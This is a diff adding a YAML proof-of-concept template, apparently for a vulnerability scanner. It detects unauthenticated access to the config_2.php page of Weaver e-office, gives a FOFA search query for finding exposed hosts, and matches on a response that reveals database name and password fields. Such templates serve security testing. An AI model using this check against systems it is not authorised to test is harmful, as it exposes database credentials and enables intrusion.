@@ -1,0 +1,15 @@
+id: poc-yaml-weaver-e-office-config-2-php-unauthorized-access
+info:
+  name: 泛微e-office config_2.php 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: e-office
+  fofa: body="eoffice"
+requests:
+- method: GET
+  path: /building/backmgr/urlpage/mobileurl/config_2.php
+  expression: status_code == 200 && contains(body,"数据库名") && contains(body,"sdbpassword")
+    && contains(body,"连接测试")
+variables: {}
+transport: http
